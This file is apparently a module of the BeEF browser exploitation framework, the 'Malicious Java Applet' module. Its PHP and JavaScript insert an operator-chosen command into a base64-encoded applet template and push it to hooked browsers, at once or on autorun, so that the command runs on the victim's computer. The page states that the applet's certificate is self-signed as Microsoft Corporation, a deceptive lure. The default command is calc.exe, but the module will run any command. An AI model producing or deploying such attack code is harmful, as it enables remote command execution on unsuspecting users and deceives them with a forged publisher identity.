<?
	// Copyright (c) 2006-2009, Wade Alcorn
	// All Rights Reserved
	// Module by: Joshua "Jabra" Abraham http://blog.spl0it.org

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>
	function get_b64_code_applet() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// do some super escaping 		
		cmd_str = document.myform.cmd.value;
		cmd_str = cmd_str.replace(/\\/g, '\\\\');
		cmd_str = cmd_str.replace(/\\/g, '\\\\');

		// replace sections of the code with user input
        b64code = b64replace(b64code, "BEEFCMD_IE",cmd_str);
        b64code = b64replace(b64code, "BEEFCMD",cmd_str);

		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Malicious Applet', get_b64_code_applet());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_applet());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Malicious Java Applet</div>
This module will execute a command on the client. The client will receive a Java Applet popup. <br><br>
The certificate is self-signed by the Microsoft Corporation.<br><br>

<div id="module_subsection">
	<form name="myform">
                <div id="module_subsection_header">Command</div>
                <input type="text" name="cmd" value="c:\windows\system32\calc.exe"/>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>

